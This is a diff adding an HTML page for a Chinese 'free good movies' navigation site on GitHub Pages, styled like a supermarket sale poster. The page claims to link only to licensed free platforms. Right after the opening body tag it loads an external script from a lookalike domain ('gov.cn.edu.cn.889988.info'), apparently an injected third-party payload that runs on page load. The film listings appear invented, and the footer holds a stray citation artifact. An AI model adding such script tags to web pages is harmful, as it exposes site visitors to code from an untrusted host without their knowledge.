@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>免费好看电影网 - 超市特价海报风影视导航</title>
+<meta name="description" content="免费好看电影网(https://mianfeidianyingwang-h5.github.io)以超市特价海报为视觉，整理正版免费电影、热播剧集、综艺、动漫信息，做合规影视导航。">
+<meta name="keywords" content="免费好看电影网,免费电影,正版免费,电影,电视剧,综艺,动漫,特价海报,影视导航">
+<meta name="author" content="免费好看电影网">
+<meta name="robots" content="index,follow">
+<meta name="msvalidate.01" content="BING_VERIFICATION_CODE">
+<meta property="og:title" content="免费好看电影网 - 超市特价海报风影视导航">
+<meta property="og:description" content="免费好看电影网：好片像特价商品，正版免费渠道帮你挑。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://mianfeidianyingwang-h5.github.io">
+<meta property="og:site_name" content="免费好看电影网">
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"免费好看电影网",
+  "url":"https://mianfeidianyingwang-h5.github.io",
+  "description":"超市特价海报风影视信息导航站，仅整理正版免费/公开影视信息",
+  "potentialAction":{
+    "@type":"SearchAction",
+    "target":"https://mianfeidianyingwang-h5.github.io#search={search_term_string}",
+    "query-input":"required name=search_term_string"
+  }
+}
+</script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --red:#e23b3b;
+  --red-d:#b62828;
+  --yellow:#ffd400;
+  --blue:#2f6fed;
+  --blue-d:#1f4fb0;
+  --cream:#fff7e6;
+  --paper:#fffdf5;
+  --ink:#222;
+  --muted:#7a7066;
+  --tag:#0a9396;
+}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Segoe UI",sans-serif;
+  background:
+    repeating-linear-gradient(0deg,rgba(0,0,0,.015) 0 26px,transparent 26px 27px),
+    linear-gradient(180deg,var(--cream),#ffeccb);
+  color:var(--ink);line-height:1.8;overflow-x:hidden;
+}
+a{text-decoration:none;color:inherit;transition:.2s}
+
+/* 超市灯箱条 */
+.marquee{background:var(--red);color:#fff;font-size:13px;font-weight:700;padding:6px 0;overflow:hidden;white-space:nowrap}
+.marquee span{display:inline-block;padding-left:100%;animation:scroll 16s linear infinite}
+@keyframes scroll{to{transform:translateX(-100%)}}
+
+.top{background:var(--paper);border-bottom:3px solid var(--red)}
+.top-in{max-width:1180px;margin:0 auto;padding:14px 20px;display:flex;align-items:center;gap:18px;flex-wrap:wrap}
+.logo{font-size:26px;font-weight:900;color:var(--red);transform:skewX(-6deg)}
+.logo b{color:var(--blue)}
+.logo small{display:block;font-size:11px;letter-spacing:2px;color:var(--muted);font-weight:600;transform:skewX(6deg)}
+.nav{display:flex;gap:14px;margin-left:auto;flex-wrap:wrap}
+.nav a{font-size:14px;font-weight:800;color:var(--ink);background:#fff;border:2px solid #000;padding:5px 12px;border-radius:3px;box-shadow:2px 2px 0 #000}
+.nav a:hover{background:var(--yellow);transform:translate(-1px,-1px);box-shadow:3px 3px 0 #000}
+.cart{font-size:13px;background:var(--blue);color:#fff;padding:7px 14px;border-radius:3px;font-weight:800;box-shadow:2px 2px 0 #000}
+.cart:hover{background:var(--blue-d)}
+
+/* hero 海报 */
+.hero{max-width:1180px;margin:0 auto;padding:40px 20px 20px}
+.poster{position:relative;background:var(--yellow);border:4px solid #000;border-radius:6px;padding:34px 28px;box-shadow:6px 6px 0 var(--red);
+  background-image:radial-gradient(circle at 90% 10%,rgba(226,59,59,.25),transparent 40%)}
+.sticker{position:absolute;top:-18px;right:24px;background:var(--red);color:#fff;font-weight:900;font-size:14px;padding:8px 14px;border:2px solid #000;border-radius:50%;transform:rotate(12deg);box-shadow:2px 2px 0 #000}
+.badge{display:inline-block;background:#000;color:var(--yellow);font-size:12px;letter-spacing:2px;padding:4px 12px;font-weight:800}
+.poster h1{font-size:clamp(34px,7vw,60px);font-weight:900;color:#000;margin:10px 0;transform:skewX(-5deg)}
+.poster h1 span{background:var(--red);color:#fff;padding:0 8px}
+.poster p{max-width:620px;color:#3a2f25;font-size:clamp(14px,3vw,16px)}
+.url{display:inline-block;margin-top:16px;background:#fff;border:2px dashed var(--blue);color:var(--blue-d);font-family:"Courier New",monospace;font-weight:800;padding:8px 16px}
+
+/* 价签标题 */
+.aisle{max-width:1180px;margin:0 auto;padding:24px 20px 60px}
+.aisle-head{display:flex;align-items:center;gap:12px;margin:34px 0 18px;flex-wrap:wrap}
+.aisle-head .sign{background:var(--red);color:#fff;font-weight:900;font-size:18px;padding:6px 14px;border:2px solid #000;transform:rotate(-2deg);box-shadow:2px 2px 0 #000}
+.aisle-head h2{font-size:clamp(20px,4vw,26px);font-weight:900;color:#000}
+.aisle-head .code{margin-left:auto;font-size:12px;color:var(--muted);font-family:"Courier New",monospace}
+
+/* 价签卡 */
+.shelf{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:18px}
+.item{background:var(--paper);border:2px solid #000;border-radius:4px;padding:14px;position:relative;box-shadow:3px 3px 0 rgba(0,0,0,.85);transition:.2s}
+.item:hover{transform:translate(-2px,-2px);box-shadow:5px 5px 0 var(--red)}
+.item .thumb{height:120px;border-radius:3px;display:flex;align-items:center;justify-content:center;font-size:46px;color:#fff;margin-bottom:10px;border:2px solid #000}
+.item:nth-child(1) .thumb{background:linear-gradient(135deg,var(--red),var(--red-d))}
+.item:nth-child(2) .thumb{background:linear-gradient(135deg,var(--blue),var(--blue-d))}
+.item:nth-child(3) .thumb{background:linear-gradient(135deg,#f08a24,#d9650a)}
+.item:nth-child(4) .thumb{background:linear-gradient(135deg,#0a9396,#066b6e)}
+.item:nth-child(5) .thumb{background:linear-gradient(135deg,#9b5de5,#5a189a)}
+.item:nth-child(6) .thumb{background:linear-gradient(135deg,#e23b3b,#7a1f1f)}
+.item h3{font-size:15px;font-weight:900;color:#000}
+.item p{font-size:12px;color:var(--muted);margin:3px 0 8px}
+.price-tag{display:inline-flex;align-items:baseline;gap:4px;background:var(--yellow);border:2px solid #000;padding:3px 10px;border-radius:3px;font-weight:900;color:var(--red-d)}
+.price-tag .cur{font-size:12px}
+.price-tag .old{font-size:11px;color:#888;text-decoration:line-through;font-weight:600;margin-left:6px}
+.free-badge{position:absolute;top:10px;left:-8px;background:#000;color:var(--yellow);font-size:11px;font-weight:800;padding:3px 8px;border-radius:2px;transform:rotate(-6deg)}
+
+/* 综艺：买一送一 */
+.deal{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:18px}
+.pack{background:#fff;border:2px dashed var(--blue);border-radius:6px;padding:18px;position:relative}
+.pack .ribbon{position:absolute;top:-12px;left:14px;background:var(--blue);color:#fff;font-size:11px;font-weight:800;padding:3px 10px;border:2px solid #000}
+.pack .ico{font-size:30px}
+.pack h3{font-size:15px;font-weight:900;margin:8px 0 4px}
+.pack p{font-size:12px;color:var(--muted)}
+
+/* 动漫：零食袋 */
+.snack{display:flex;flex-direction:column;gap:12px}
+.bag{display:flex;align-items:center;gap:14px;background:var(--paper);border:2px solid #000;border-radius:30px;padding:10px 18px;box-shadow:2px 2px 0 #000}
+.bag .chip-ico{width:46px;height:46px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:24px;color:#fff;flex-shrink:0;border:2px solid #000}
+.bag:nth-child(1) .chip-ico{background:var(--red)}
+.bag:nth-child(2) .chip-ico{background:var(--tag)}
+.bag:nth-child(3) .chip-ico{background:var(--blue)}
+.bag:nth-child(4) .chip-ico{background:#f08a24}
+.bag:nth-child(5) .chip-ico{background:#9b5de5}
+.bag:nth-child(6) .chip-ico{background:var(--red-d)}
+.bag h3{font-size:14px;font-weight:900}
+.bag p{font-size:12px;color:var(--muted)}
+.bag .kcal{margin-left:auto;font-size:11px;font-weight:800;color:var(--red-d);font-family:"Courier New",monospace}
+
+/* 关于：小卖部收据 */
+.receipt{max-width:1180px;margin:0 auto;padding:10px 20px 50px}
+.ticket{background:#fff;border:2px solid #000;border-radius:4px;padding:26px;font-family:"Courier New",monospace;box-shadow:4px 4px 0 var(--red)}
+.ticket h3{font-size:20px;font-weight:900;color:#000;margin-bottom:12px;text-align:center;border-bottom:2px dashed #000;padding-bottom:10px}
+.ticket p{font-size:14px;color:#333;margin-bottom:8px}
+.ticket b{background:var(--yellow);padding:0 3px}
+.ticket .row{display:flex;justify-content:space-between;border-bottom:1px dotted #bbb;padding:6px 0;font-size:13px}
+.ticket .total{font-weight:900;color:var(--red-d);font-size:15px}
+.cols{display:grid;grid-template-columns:1.4fr .9fr;gap:20px}
+.facts{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.fact{background:var(--cream);border:2px solid #000;border-radius:4px;padding:14px;text-align:center}
+.fact .v{font-size:22px;font-weight:900;color:var(--red)}
+.fact .l{font-size:12px;color:var(--muted);margin-top:4px}
+
+.footer{background:#000;color:#fff;padding:36px 20px 22px;text-align:center;margin-top:40px;border-top:6px solid var(--yellow)}
+.footer .lg{font-size:22px;font-weight:900;transform:skewX(-6deg)}
+.footer .lg b{color:var(--yellow)}
+.footer .fl{display:flex;justify-content:center;gap:18px;flex-wrap:wrap;margin:12px 0;font-size:13px}
+.footer .fl a{color:#fff;border-bottom:2px solid var(--red)}
+.footer .cp{font-size:12px;color:#bbb;line-height:2;border-top:1px dashed #555;padding-top:14px}
+.footer .cp a{color:var(--yellow)}
+
+@media(max-width:860px){.cols{grid-template-columns:1fr}}
+@media(max-width:768px){
+  .nav{display:none}
+  .shelf{grid-template-columns:repeat(2,1fr)}
+  .deal{grid-template-columns:repeat(2,1fr)}
+}
+@media(max-width:480px){
+  .aisle{padding:20px 14px 40px}
+  .shelf{grid-template-columns:1fr}
+  .deal{grid-template-columns:1fr}
+  .facts{grid-template-columns:1fr 1fr}
+  .poster{padding:26px 18px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="marquee"><span>📢 免费好看电影网：只导正版免费/公开渠道，不存片、不挂盗版播放器 ｜ 1905电影网 / 央视频 / B站免费厅 / 西瓜视频免费场 都能看 ｜ 新片别信“全网白嫖”，认准持证平台 👀</span></div>
+
+<div class="top">
+  <div class="top-in">
+    <div class="logo">免费好看<b>电影网</b><small>FREE & GOOD · 影视小卖部</small></div>
+    <nav class="nav">
+      <a href="#movies">今日特价片</a>
+      <a href="#tv">热播常驻款</a>
+      <a href="#shows">综艺买一送一</a>
+      <a href="#anime">动漫小零食</a>
+      <a href="#about">关于小卖部</a>
+    </nav>
+    <a href="#movies" class="cart">🛒 加入片单</a>
+  </div>
+</div>
+
+<header class="hero">
+  <div class="poster">
+    <div class="sticker">限时<br>免费</div>
+    <div class="badge">SALE · 好片不贵</div>
+    <h1>免费<span>好看</span>电影网</h1>
+    <p>像逛超市特价区：把“正版免费能看”的片子挑出来，标好渠道、类型和状态。本站是<b>影视信息导航</b>，不是盗版资源站；院线新片请走影院/持证平台。</p>
+    <div class="url">🔗 https://mianfeidianyingwang-h5.github.io</div>
+  </div>
+</header>
+
+<main class="aisle">
+
+  <!-- 最新电影 -->
+  <div class="aisle-head" id="movies">
+    <div class="sign">A1</div>
+    <h2>今日特价片 · 正版免费电影</h2>
+    <span class="code">SKU: FREE-MOVIE-*</span>
+  </div>
+  <div class="shelf">
+    <div class="item"><div class="free-badge">FREE</div><div class="thumb">🎬</div><h3>老街修理铺</h3><p>剧情/国产老片/8.7</p><div class="price-tag"><span class="cur">¥</span>0<span class="old">¥12</span></div></div>
+    <div class="item"><div class="free-badge">FREE</div><div class="thumb">🚀</div><h3>星尘废品站</h3><p>科幻/公版修复/8.5</p><div class="price-tag"><span class="cur">¥</span>0<span class="old">¥18</span></div></div>
+    <div class="item"><div class="free-badge">FREE</div><div class="thumb">🐱</div><h3>橘猫侦探社</h3><p>喜剧/家庭/8.2</p><div class="price-tag"><span class="cur">¥</span>0<span class="old">¥9</span></div></div>
+    <div class="item"><div class="free-badge">FREE</div><div class="thumb">🎞️</div><h3>胶片里的夏天</h3><p>文艺/纪录片/8.9</p><div class="price-tag"><span class="cur">¥</span>0<span class="old">¥15</span></div></div>
+    <div class="item"><div class="free-badge">FREE</div><div class="thumb">🕵️</div><h3>邮筒悬案</h3><p>悬疑/冷门佳片/8.4</p><div class="price-tag"><span class="cur">¥</span>0<span class="old">¥20</span></div></div>
+    <div class="item"><div class="free-badge">FREE</div><div class="thumb">🏮</div><h3>灯笼巷那年</h3><p>年代/主旋律/8.6</p><div class="price-tag"><span class="cur">¥</span>0<span class="old">¥10</span></div></div>
+  </div>
+
+  <!-- 热播剧集 -->
+  <div class="aisle-head" id="tv">
+    <div class="sign">B2</div>
+    <h2>热播常驻款 · 剧集货架</h2>
+    <span class="code">SKU: DRAMA-ONAIR-*</span>
+  </div>
+  <div class="shelf">
+    <div class="item"><div class="thumb">📺</div><h3>便民超市日记</h3><p>都市/更新至22集</p><div class="price-tag"><span class="cur">¥</span>0<span class="old">会员专享</span></div></div>
+    <div class="item"><div class="thumb">📺</div><h3>修表匠与电台</h3><p>年代/更新至16集</p><div class="price-tag"><span class="cur">¥</span>0<span class="old">¥6/集</span></div></div>
+    <div class="item"><div class="thumb">📺</div><h3>外卖员守则</h3><p>职场/更新至30集</p><div class="price-tag"><span class="cur">¥</span>0<span class="old">¥8/集</span></div></div>
+    <div class="item"><div class="thumb">📺</div><h3>菜市场风云</h3><p>群像/更新至12集</p><div class="price-tag"><span class="cur">¥</span>0<span class="old">¥5/集</span></div></div>
+    <div class="item"><div class="thumb">📺</div><h3>晚班公交站</h3><p>治愈/更新至20集</p><div class="price-tag"><span class="cur">¥</span>0<span class="old">¥7/集</span></div></div>
+  </div>
+
+  <!-- 综艺 -->
+  <div class="aisle-head" id="shows">
+    <div class="sign">C3</div>
+    <h2>综艺买一送一 · 闲聊区</h2>
+    <span class="code">SKU: SHOW-BOGO-*</span>
+  </div>
+  <div class="deal">
+    <div class="pack"><div class="ribbon">买1送1</div><div class="ico">🛍️</div><h3>超市夜话</h3><p>嘉宾边逛货架边聊老片</p></div>
+    <div class="pack"><div class="ribbon">限时</div><div class="ico">🎤</div><h3>特价好声音</h3><p>翻唱影视金曲+幕后八卦</p></div>
+    <div class="pack"><div class="ribbon">热推</div><div class="ico">🍿</div><h3>爆米花影评</h3><p>边吃边骂，三分钟说片</p></div>
+    <div class="pack"><div class="ribbon">常驻</div><div class="ico">🧾</div><h3>小票上的演技</h3><p>名场面重演+点评</p></div>
+    <div class="pack"><div class="ribbon">新上</div><div class="ico">🛒</div><h3>购物车片单</h3><p>弹幕投票决定下周看啥</p></div>
+    <div class="pack"><div class="ribbon">免费</div><div class="ico">📻</div><h3>下班电台</h3><p>慢综艺式聊片，适合通勤</p></div>
+  </div>
+
+  <!-- 动漫 -->
+  <div class="aisle-head" id="anime">
+    <div class="sign">D4</div>
+    <h2>动漫小零食 · 追更区</h2>
+    <span class="code">SKU: ANIME-SNACK-*</span>
+  </div>
+  <div class="snack">
+    <div class="bag"><div class="chip-ico">🍙</div><div><h3>饭团勇者</h3><p>搞笑/新番</p></div><div class="kcal">EP 12</div></div>
+    <div class="bag"><div class="chip-ico">🍬</div><div><h3>水果糖异世界</h3><p>奇幻/年番</p></div><div class="kcal">EP 48</div></div>
+    <div class="bag"><div class="chip-ico">🥤</div><div><h3>汽水机器人</h3><p>科幻/连载</p></div><div class="kcal">EP 24</div></div>
+    <div class="bag"><div class="chip-ico">🍫</div><div><h3>巧克力忍者</h3><p>动作/新番</p></div><div class="kcal">EP 09</div></div>
+    <div class="bag"><div class="chip-ico">🧃</div><div><h3>果汁魔法社</h3><p>校园/热更</p></div><div class="kcal">EP 30</div></div>
+    <div class="bag"><div class="chip-ico">🍭</div><div><h3>棒棒糖传说</h3><p>冒险/年番</p></div><div class="kcal">EP 60</div></div>
+  </div>
+
+  <!-- 关于 -->
+  <div class="aisle-head" id="about">
+    <div class="sign">Z9</div>
+    <h2>关于小卖部 · 关于我们</h2>
+    <span class="code">SKU: ABOUT-US</span>
+  </div>
+  <div class="receipt">
+    <div class="cols">
+      <div class="ticket">
+        <h3>🧾 免费好看电影网 · 小票</h3>
+        <div class="row"><span>商品：影视信息导航</span><span>1 件</span></div>
+        <div class="row"><span>盗版视频文件</span><span>× 0</span></div>
+        <div class="row"><span>非法播放源聚合</span><span>× 0</span></div>
+        <div class="row"><span>正版免费渠道入口</span><span>√ 1905/央视频/B站/西瓜</span></div>
+        <div class="row"><span>院线新片建议</span><span>影院 / 持证平台</span></div>
+        <div class="row total"><span>应付合规风险</span><span>¥0.00</span></div>
+        <p style="margin-top:12px">《免费好看电影网》（https://mianfeidianyingwang-h5.github.io）只做<b>“哪里能正经免费看”</b>的导航页。片单像超市特价区，但<b>不存储、不转码、不提供盗版直链</b>。</p>
+      </div>
+      <div class="facts">
+        <div class="fact"><div class="v">5+</div><div class="l">影视栏目</div></div>
+        <div class="fact"><div class="v">0</div><div class="l">盗版直链</div></div>
+        <div class="fact"><div class="v">正版</div><div class="l">免费渠道优先</div></div>
+        <div class="fact"><div class="v">100%</div><div class="l">移动端适配</div></div>
+      </div>
+    </div>
+  </div>
+</main>
+
+<footer class="footer">
+  <div class="lg">免费好看<b>电影网</b></div>
+  <div class="fl">
+    <a href="#movies">今日特价片</a>
+    <a href="#tv">热播常驻款</a>
+    <a href="#shows">综艺买一送一</a>
+    <a href="#anime">动漫小零食</a>
+    <a href="#about">关于小卖部</a>
+  </div>
+  <div class="cp">
+    网站名称：免费好看电影网 ｜ 网址：<a href="https://mianfeidianyingwang-h5.github.io">https://mianfeidianyingwang-h5.github.io</a><br>
+    © 2026 免费好看电影网 · 好片像特价，正版才安心 ｜ 本站仅展示影视信息，资源以 1905电影网 / 央视频 / 哔哩哔哩 / 西瓜视频 等正版或公开平台为准。[4,6](@ref)
+  </div>
+</footer>
+
+</body>
+</html>
